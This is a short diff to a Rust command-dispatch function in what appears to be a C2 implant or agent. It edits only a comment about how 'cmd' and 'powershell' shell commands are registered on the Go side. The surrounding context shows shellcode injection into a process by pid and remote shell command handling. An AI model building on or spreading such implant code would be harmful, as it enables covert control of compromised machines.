@@ -74,8 +74,8 @@ fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
             let sc = link_common::extract_param(parameters, "shellcode");
             inject_cmd(&format!("{} {}", pid, sc)).into()
         }
-        // cmd and powershell are Windows-specific shell variants;
-        // the Go side registers only "shell" — these are handled here for compat.
+        // cmd and powershell are Windows-specific shell variants,
+        // registered separately on the Go side (cmd.go, powershell.go).
         "cmd" | "powershell" | "shell" => {
             let cmd = link_common::extract_param(parameters, "command");
             let cmd_str = if cmd.is_empty() { parameters } else { &cmd };
